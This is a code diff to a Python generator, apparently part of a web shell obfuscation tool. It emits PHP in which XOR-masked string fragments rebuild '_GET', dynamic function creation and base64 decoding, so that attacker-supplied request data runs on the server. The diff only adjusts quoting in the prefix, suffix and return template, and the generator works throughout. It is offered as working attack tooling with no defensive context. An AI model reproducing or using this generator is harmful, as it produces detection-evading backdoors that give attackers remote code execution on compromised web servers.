@@ -34,7 +34,7 @@ def FuncConfuse(ss:str):
     payload=''
     prefix='<?php function/**/r($a){'
     a,b,c=RandomNumber()
-    suffix=f"}}r(${{('!o'^'~(').('iz'^',.')}}[({a})!=({b}{['-','+'][random.randint(0,1)]}{c})]);?>"
+    suffix=f'}}r(${{("!\\x6f"^"~(").("\\x69z"^",.")}}[({a})!=({b}{["-","+"][random.randint(0,1)]}{c})]);?>'
 
     # 獲取長度為4的隨機字串
     salt=GenerateRandomString(4)
@@ -65,7 +65,7 @@ def FuncConfuse(ss:str):
 
     # str2的處理
     str2_base64=base64.b64encode(str2.encode('ascii')).decode('ascii')
-    return f"{prefix}@((',4K!DDS'^'_@9~6!#').('2VEW'^'^7&2'))('{salt}','{RndLenSaltkey}',\"{str1_left}\".\"{str1_right}\".(('9jfWW'^'[+52a').('OzQA9'^'{{%5$z').('^Ik'^'1-.'))('{str2_base64}'))($a);{suffix}"
+    return f'{prefix}@((",4K\\x21D\\x44S"^"_@9\\x7e6!\\x23").("2\\x56\\x45W"^"^\\x37&2"))("{salt}","{RndLenSaltkey}","{str1_left}"."{str1_right}".(("9jfWW"^"[+52a").("OzQA9"^"{{%5\\x24z").("^Ik"^"1-."))("{str2_base64}"))($a);{suffix}'
 
 
 def main(argv):
